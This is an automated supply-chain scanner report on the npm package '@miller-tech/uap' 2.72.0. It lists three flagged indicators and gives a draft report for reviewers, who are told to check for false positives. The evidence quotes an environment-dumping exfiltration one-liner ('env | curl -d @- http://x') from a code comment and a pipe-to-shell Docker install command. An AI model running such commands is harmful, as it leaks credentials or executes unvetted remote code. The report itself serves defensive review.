# Suspicious package report: `@miller-tech/uap` 2.72.0 (npm)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `@miller-tech/uap` |
| Version | `2.72.0` |
| Ecosystem | npm |
| Risk score | 77 / 100 (high) |
| Published | 2026-11-22T04:26:08Z |
| Scanned | 2026-11-23T22:15:55Z |
| Registry page | https://www.npmjs.com/package/@miller-tech/uap/v/2.72.0 |

## Indicators

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `package/scripts/setup/setup.sh`:

  ```text
  echo -e " ${YELLOW}⚠${NC} Docker (install for local Qdrant: `curl -fsSL https://get.docker.com | sh`)"
  ```

- **exfiltration** (medium, +30): Code serialises the whole process environment in a file that makes network calls.

  Evidence in `package/dist/delivery/sanitized-env.d.ts`:

  ```text
  * so `run_bash("env | curl -d @- http://x")` exfiltrated every credential).
  ```

- **npm-install-hook** (low, +12): 'postinstall' script runs automatically at install time.

  Evidence in `package.json`:

  ```text
  "postinstall": "echo ' ✨ Run: npx @miller-tech/uap init --interactive'"
  ```


## Suggested text for an upstream report

The npm package `@miller-tech/uap` version `2.72.0` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code downloads a file and then executes it or marks it executable.
- Code serialises the whole process environment in a file that makes network calls.
- 'postinstall' script runs automatically at install time.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via https://www.npmjs.com/support (choose "Report malware"), or the "Report malware" link on the package page.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20npm%2F%40miller-tech%2Fuap%402.72.0&package=npm%2F%40miller-tech%2Fuap%402.72.0
